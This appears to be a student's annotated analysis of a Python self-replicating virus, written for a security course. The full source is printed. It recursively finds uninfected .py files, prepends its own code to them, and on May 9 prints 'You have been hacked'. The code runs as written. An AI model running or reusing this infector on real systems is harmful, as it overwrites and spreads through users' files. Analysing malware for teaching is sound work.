# Script: 14 - Python Malware Analysis
# Author: Robert Gregor
# Date of latest revision: 302030FMAR23

# Objectives
    # Perform an analysis of the Python-based code given below
        # Insert comments into each line of the script explaining in your own words what the virus is doing on this line
        # Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out
        # Insert comments above the final three lines explaining how the functions are called and what this script appears to do

# My Sources:
    # [Python | os.listdir() method](https://www.geeksforgeeks.org/python-os-listdir-method/)
    # [Python For Loops](https://www.w3schools.com/python/python_for_loops.asp)
    # [Python | os.path.isdir() method](https://www.geeksforgeeks.org/python-os-path-isdir-method/)
    # [Python List extend()](https://www.programiz.com/python-programming/methods/list/extend)
    # [Python break statement](https://www.tutorialspoint.com/python/python_break_statement.htm)
    # [Python: os.path.abspath() method with example](https://www.geeksforgeeks.org/python-os-path-abspath-method-with-example/)
    # [Python File close() Method](https://www.tutorialspoint.com/python/file_close.htm)
    # [Python File Write](https://www.w3schools.com/python/python_file_write.asp)


# Main

#!/usr/bin/python3

# Imports os and datetime modules

import os
import datetime

# Sets the SIGNATURE variable equal to the string VIRUS
SIGNATURE = "VIRUS"

# Function takes path variable as parameter and searches for files to target
def locate(path):
    # Declares empty list
    files_targeted = []
    # Sets filelist equal to list of all files and directories in path variable
    filelist = os.listdir(path)
    # for loop used to apply coonditionals below to each item in filelist 
    for fname in filelist:
        # Conditional checks if path is an existing directory or not
        if os.path.isdir(path+"/"+fname):
            # If true, execute the locate function to append additional files to end of list
            files_targeted.extend(locate(path+"/"+fname))
        # Conditional checks if any of the files are python files
        elif fname[-3:] == ".py":
            # If true, set the infected variable equal to False
            infected = False
            # for loop used to open each file in the given path
            for line in open(path+"/"+fname):
                # Conditional checks if SIGNATURE string "VIRUS" is in any line in file
                if SIGNATURE in line:
                    # If true, sets infected variable to True and exits current for loop
                    infected = True
                    break
            # Conditional check if infected is False
            if infected == False:
                # If true, add file to given directory for targetting
                files_targeted.append(path+"/"+fname)
    # return all files that are not yet infected
    return files_targeted

# Function used to infect all files identified by locate function
def infect(files_targeted):
    # Set virus variable equal to pathname to path passed as parameter
    virus = open(os.path.abspath(__file__))
    # Sets virusstring variable to an empty string
    virusstring = ""
    # for loop used to enumerate through each line in virus variable
    for i,line in enumerate(virus):
        # Conditional checks if line is greater then or equl to zero AND less then 39
        if 0 <= i < 39:
            # If true, add line to virusstring
            virusstring += line
    # Closed virus file
    virus.close
    # for loop used to executes commands on each item in files_targeted
    for fname in files_targeted:
        # Opens file
        f = open(fname)
        # Set temp variable equal to contents of file opened
        temp = f.read()
        # Closes file
        f.close()
        # Open file to write to
        f = open(fname,"w")
        # Write over previous file with current file
        f.write(virusstring + temp)
        # Closes file
        f.close()

# Function used to print "You have been hacked" at a specified time
def detonate():
    # Conditional checks if current month is equal to 5 and current date is equal to 9
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If true, prints statement
        print("You have been hacked")

# Declares file_targeted variable equal to current directory files
files_targeted = locate(os.path.abspath(""))
# Runs infect function on files_targeted
infect(files_targeted)
# Runs detonate function
detonate()

# End